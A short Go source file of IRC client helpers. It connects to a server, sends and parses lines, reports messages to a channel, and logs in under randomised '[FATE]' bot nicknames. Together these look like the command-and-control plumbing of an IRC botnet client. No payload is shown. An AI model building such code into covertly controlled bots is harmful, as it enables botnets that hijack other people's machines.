package pkg

import (
	"fmt"
	"math/rand"
	"net"
	"strings"
	"time"
)

type logFormation struct {
	user, nick string
}

func IRC_Conn(set_serv string) net.Conn {
	conn, _ := net.Dial("tcp", set_serv)
	return conn
}

func IRC_Find(read, msg string) bool { return strings.Contains(read, msg) }

func IRC_Recv(cmd string, arg int) string { return strings.Split(cmd, " ")[arg] }

func IRC_Send(sendIRC net.Conn, data string) { fmt.Fprintf(sendIRC, "%s\r\n", data) }

func IRC_Report(set_serv net.Conn, set_chan, msg string) {
	IRC_Send(set_serv, "PRIVMSG "+set_chan+" "+" :"+msg)
}

//Config bot profile in "formation" structure.
func IRC_Login(log_serv net.Conn, set_chan, set_chan_pass string) {
	rand.Seed(time.Now().UnixNano())
	alphabet := 'A' + rune(rand.Intn(26))
	sAlphabet := string(alphabet)
	botID := rand.Intn(1000000)

	formation := logFormation{
		user: fmt.Sprint("USER [FATE][", sAlphabet, "][", botID, "]", " 8 * :bot"),
		nick: fmt.Sprint("NICK [FATE][", sAlphabet, "][", botID, "]"),
	}

	//login to server
	IRC_Send(log_serv, formation.user)
	IRC_Send(log_serv, formation.nick)
}
